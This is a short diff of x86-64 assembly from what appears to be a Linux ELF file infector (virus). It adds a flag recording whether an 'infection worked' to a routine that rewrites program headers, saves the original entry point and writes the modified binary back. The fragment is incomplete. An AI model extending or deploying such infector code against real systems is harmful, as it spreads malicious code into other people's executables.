@@ -20,6 +20,7 @@ _update_mmaped_file: ; update_mmaped_file(void *mmap_base_address, long file_siz
 	; rsp + 104 = 0
 	; rsp + 108 mmap_tmp addr
 	; rsp + 116 index mmap_tmp
+	; rsp + 124 set to 1 if infection worked, 0 else
 	;;;;;;;;;;;;;;;;;;;;;
 
 ; init phase
@@ -31,6 +32,7 @@ _update_mmaped_file: ; update_mmaped_file(void *mmap_base_address, long file_siz
 	mov QWORD [rsp + 16], rdx
 
 	mov QWORD [rsp + 24], r10
+	mov QWORD [rsp + 124], 0
 
 ; init phdr (ehdr + ehdr->e_phoff)
 	mov r10, QWORD [rsp] ; take the mmap_base_address
@@ -223,7 +225,7 @@ _write_in_tmp_map:
 ;; memcpy(mmap_tmp + index, o_entry, 8);
 	mov rdi, QWORD [rsp + 108]
 	add rdi, QWORD [rsp + 116]
-	mov rsi, rsp ; 
+	mov rsi, rsp ;
 	add rsi, 80
 	mov rcx, 8 ; size
 	cld
@@ -267,9 +269,10 @@ _write_into_file:
 	mov rax, 1
 	mov rdi, QWORD [rsp + 24]
 	mov rsi, QWORD [rsp + 108]
-	mov rdx, QWORD [rsp + 8] 
+	mov rdx, QWORD [rsp + 8]
 	add rdx, 4096
 	syscall
+	mov QWORD [rsp + 124], 1
 
 _munmap:
 	mov rax, 11
@@ -279,5 +282,6 @@ _munmap:
 	syscall
 
 _end:
+	mov rax, QWORD [rsp + 124]
 	leave
 	ret
